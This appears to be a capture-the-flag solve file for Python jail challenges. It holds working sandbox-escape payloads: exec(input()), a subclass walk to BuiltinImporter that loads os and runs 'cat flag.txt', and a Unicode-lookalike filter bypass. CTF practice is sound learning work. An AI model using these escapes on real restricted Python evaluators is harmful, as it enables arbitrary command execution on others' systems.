# Solve 1:
# max 30 characters, open is removed
# exec(input())
# import os;os.system('cat flag.txt')

# Solve 2
# max 15 characters, open and imports are removed

"""
1. exec(input())

2. print(().__class__.__mro__[1].__subclasses__())

for i,j in enumerate(x):
    if "importer" in str(j).lower(): print(i,j)

# 
3. find index of <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[120]().load_module('os').system('cat flag.txt')
"""

# Solve 3
𝑒𝓍𝑒𝒸(𝒾𝓃𝓅𝓊𝓉())

𝚙𝚛𝚒𝚗𝚝
"""
https://lingojam.com/FancyTextGenerator
"""

